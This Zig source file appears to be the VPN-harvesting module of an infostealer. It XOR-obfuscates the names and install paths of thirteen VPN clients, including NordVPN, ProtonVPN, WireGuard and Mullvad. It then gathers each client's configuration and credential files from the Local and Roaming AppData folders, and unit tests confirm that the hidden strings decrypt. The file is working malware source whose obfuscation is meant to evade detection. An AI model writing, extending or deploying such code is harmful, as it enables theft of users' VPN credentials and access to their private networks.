const std = @import("std");
const hash = @import("../types/hash.zig");

pub const VpnEntry = struct {
    name: []const u8,
    files: [][]const u8,
};

const E = struct {
    pub const num_vpns = 13;
    pub const names = [num_vpns][]const u8{
        &hash.xorEncrypt("NordVPN"),
        &hash.xorEncrypt("OpenVPN"),
        &hash.xorEncrypt("ProtonVPN"),
        &hash.xorEncrypt("ExpressVPN"),
        &hash.xorEncrypt("Surfshark"),
        &hash.xorEncrypt("CyberGhost"),
        &hash.xorEncrypt("PIA"),
        &hash.xorEncrypt("Windscribe"),
        &hash.xorEncrypt("TunnelBear"),
        &hash.xorEncrypt("Hotspot Shield"),
        &hash.xorEncrypt("VyprVPN"),
        &hash.xorEncrypt("WireGuard"),
        &hash.xorEncrypt("Mullvad"),
    };
    pub const paths = [num_vpns][]const u8{
        &hash.xorEncrypt("NordVPN"),
        &hash.xorEncrypt("OpenVPN Connect\\profiles"),
        &hash.xorEncrypt("ProtonVPN"),
        &hash.xorEncrypt("ExpressVPN"),
        &hash.xorEncrypt("Surfshark"),
        &hash.xorEncrypt("CyberGhost"),
        &hash.xorEncrypt("Private Internet Access"),
        &hash.xorEncrypt("Windscribe"),
        &hash.xorEncrypt("TunnelBear"),
        &hash.xorEncrypt("HotspotShield"),
        &hash.xorEncrypt("VyprVPN"),
        &hash.xorEncrypt("WireGuard\\Configurations"),
        &hash.xorEncrypt("Mullvad VPN"),
    };
    pub const use_local = [num_vpns]bool{
        true,  // NordVPN
        false, // OpenVPN
        true,  // ProtonVPN
        false, // ExpressVPN
        false, // Surfshark
        false, // CyberGhost
        false, // PIA
        true,  // Windscribe
        false, // TunnelBear
        true,  // Hotspot Shield
        false, // VyprVPN
        false, // WireGuard
        true,  // Mullvad
    };
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn listAllFiles(allocator: std.mem.Allocator, dir_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn listFilesByExt(allocator: std.mem.Allocator, dir_path: []const u8, ext: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, ext)) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
        try files.append(full);
    }
    return try files.toOwnedSlice();
}

fn listFilesByExts(allocator: std.mem.Allocator, dir_path: []const u8, exts: []const []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
    defer dir.close();
    var iter = dir.iterate();
    while (try iter.next()) |entry| {
        if (entry.kind != .file) continue;
        for (exts) |ext| {
            if (std.mem.endsWith(u8, entry.name, ext)) {
                const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
                try files.append(full);
                break;
            }
        }
    }
    return try files.toOwnedSlice();
}

fn collectProtonVPN(allocator: std.mem.Allocator, proton_path: []const u8) ![][]const u8 {
    var configs = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (configs.items) |c| allocator.free(c);
        configs.deinit();
    }
    var dir = std.fs.openDirAbsolute(proton_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();
    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .directory) continue;
        const uc_path = std.fs.path.join(allocator, &[_][]const u8{ proton_path, entry.name, "user.config" }) catch continue;
        var file = std.fs.openFileAbsolute(uc_path, .{}) catch {
            allocator.free(uc_path);
            continue;
        };
        file.close();
        try configs.append(uc_path);
    }
    return try configs.toOwnedSlice();
}

fn collectVpnFiles(allocator: std.mem.Allocator, index: usize, full_path: []const u8) ![][]const u8 {
    switch (index) {
        0 => return listAllFiles(allocator, full_path),
        1 => return listFilesByExt(allocator, full_path, ".ovpn"),
        2 => return collectProtonVPN(allocator, full_path),
        3, 5, 6, 8, 9, 10 => return listAllFiles(allocator, full_path),
        4 => return listFilesByExt(allocator, full_path, ".dat"),
        7 => return listFilesByExts(allocator, full_path, &[_][]const u8{ ".json", ".dat" }),
        11 => return listFilesByExt(allocator, full_path, ".conf"),
        12 => return listFilesByExt(allocator, full_path, ".json"),
        else => return allocator.alloc([]const u8, 0),
    }
}

pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) ![]VpnEntry {
    var entries = std.ArrayList(VpnEntry).init(allocator);
    errdefer {
        for (entries.items) |e| {
            allocator.free(e.name);
            for (e.files) |f| allocator.free(f);
            allocator.free(e.files);
        }
        entries.deinit();
    }

    inline for (0..E.num_vpns) |i| {
        const base = if (E.use_local[i]) local else roaming;

        const pe = E.paths[i];
        var path_buf: [pe.len]u8 = undefined;
        hash.xorDecrypt(pe, &path_buf);

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ base, &path_buf }) catch continue;

        if (i != 2) {
            if (!dirExists(full_path)) {
                allocator.free(full_path);
                continue;
            }
        }

        const files = collectVpnFiles(allocator, i, full_path) catch |err| {
            allocator.free(full_path);
            if (err == error.FileNotFound or err == error.NotDir or err == error.AccessDenied) continue;
            return err;
        };

        allocator.free(full_path);

        const ne = E.names[i];
        var name_buf: [ne.len]u8 = undefined;
        hash.xorDecrypt(ne, &name_buf);
        const name = allocator.dupe(u8, &name_buf) catch {
            for (files) |f| allocator.free(f);
            allocator.free(files);
            return error.OutOfMemory;
        };

        try entries.append(VpnEntry{ .name = name, .files = files });
    }

    return try entries.toOwnedSlice();
}

test "all names decrypt correctly" {
    inline for (0..E.num_vpns) |i| {
        var buf: [E.names[i].len]u8 = undefined;
        hash.xorDecrypt(E.names[i], &buf);
        try std.testing.expect(buf.len > 0);
    }
}

test "NordVPN name decrypts" {
    var buf: [E.names[0].len]u8 = undefined;
    hash.xorDecrypt(E.names[0], &buf);
    try std.testing.expectEqualStrings("NordVPN", &buf);
}

test "collect returns empty for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer {
        for (result) |e| {
            std.testing.allocator.free(e.name);
            for (e.files) |f| std.testing.allocator.free(f);
            std.testing.allocator.free(e.files);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "all VPN paths decrypt to non-empty" {
    inline for (0..E.num_vpns) |i| {
        var buf: [E.paths[i].len]u8 = undefined;
        hash.xorDecrypt(E.paths[i], &buf);
        try std.testing.expect(buf.len > 0);
        try std.testing.expect(buf[0] != 0);
    }
}
